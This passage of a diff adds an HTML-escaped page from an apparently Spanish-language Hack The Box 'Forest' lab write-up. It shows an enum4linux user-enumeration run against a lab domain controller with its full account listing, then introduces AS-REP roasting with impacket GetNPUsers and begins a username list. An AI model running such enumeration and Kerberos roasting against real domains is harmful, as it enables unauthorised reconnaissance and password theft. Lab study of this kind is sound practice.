+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/forest# enum4linux -U -l 10.10.10.161 
+Starting enum4linux v0.8.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; on Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 04:31:58 &lt;span class=&#34;nv&#34;&gt;2019&lt;/span&gt;
+
+ &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Target Information    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
+Target ........... 10.10.10.161
+RID Range ........ 500-550,1000-1050
+Username ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+Password ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, &lt;span class=&#34;nv&#34;&gt;none&lt;/span&gt;
+
+
+ &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Enumerating Workgroup/Domain on 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find workgroup/domain
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Session Check on 10.10.10.161    |
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Server 10.10.10.161 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
+Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 451.
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Got domain/workgroup name: 
+
+ &lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting information via LDAP &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt; 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Long domain name &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161: htb.local
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.10.161 appears to be a root/parent &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;
+
+ &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting domain SID &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
+Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 359.
+Domain Name: HTB
+Domain Sid: S-1-5-21-3072663084-364016917-1341370565
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Host is part of a domain &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;not a workgroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+
+ &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
+Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 866.
+index: 0x2137 RID: 0x463 acb: 0x00020015 Account: &lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator	Name: Administrator	Desc: Built-in account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; administering the computer/domain
+index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: A user account managed by the system.
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: Built-in account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; guest access to the computer/domain
+index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: Key Distribution Center Service Account
+index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;8cc370d3-822a-4ab8-a926-bb94bd0641a9&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+
+Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 881.
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Administrator&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f4&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Guest&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f5&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;krbtgt&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f6&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DefaultAccount&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f7&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x463&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_2c8eef0a09b545acb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x464&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_ca8c2ed5bdab4dc9b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x465&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_75a538d3025e4db9a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x466&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_681f53d4942840e18&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x467&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_1b41c9286325456bb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x468&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_9b69f1b9d2cc45549&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x469&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_7c96b981967141ebb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_c75ee099d0a64c91b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_1ffab36a2f5f479cb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxc3d7722&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxfc9daad&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxc0a90c9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x470&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox670628e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x471&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox968e74d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x472&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox6ded678&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x473&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox83d6781&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x474&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxfd87238&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x475&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxb01ac64&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x476&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox7108a4e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x477&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox0659cc1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x478&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sebastien&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x479&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;lucinda&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-alfresco&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;andy&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mark&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;santi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x480&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+enum4linux &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; on Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 04:32:35 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;kerberos---impacket-getnpusers&#34;&gt;KERBEROS - impacket GetNPUsers&lt;/h2&gt;
+&lt;p&gt;Obtuvimos poca informacion sobre el puerto de ldap, pero obtuvimos una lista de usuarios, vamos al puerto 88 de autenticacion de kerberos para obtener informacion sobre ese puerto utilizando la lista de usuarios y uno de los scripts de impacket para verificar si uno de los usuarios nos permite recolectar mensajes AS_REP sin pre autenticacion.&lt;/p&gt;
+&lt;p&gt;Lista de Usuarios:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Administrator
+Guest
+krbtgt
+DefaultAccount
+&lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+SM_681f53d4942840e18
+SM_1b41c9286325456bb
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailbox83d6781
+HealthMailboxfd87238
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
